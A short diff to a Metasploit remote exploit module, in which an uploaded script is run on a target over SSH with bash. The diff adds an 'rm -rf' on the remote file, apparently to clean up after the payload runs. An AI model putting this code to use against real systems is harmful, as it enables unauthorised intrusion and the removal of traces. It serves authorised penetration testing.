@@ -142,6 +142,8 @@ class MetasploitModule < Msf::Exploit::Remote
         print_status result
         result = ssh.exec! ("bash " + remote_location )
         print_status result
+		result = ssh.exec! ("rm -rf " + remote_location )
+        print_status result
       end
 
     
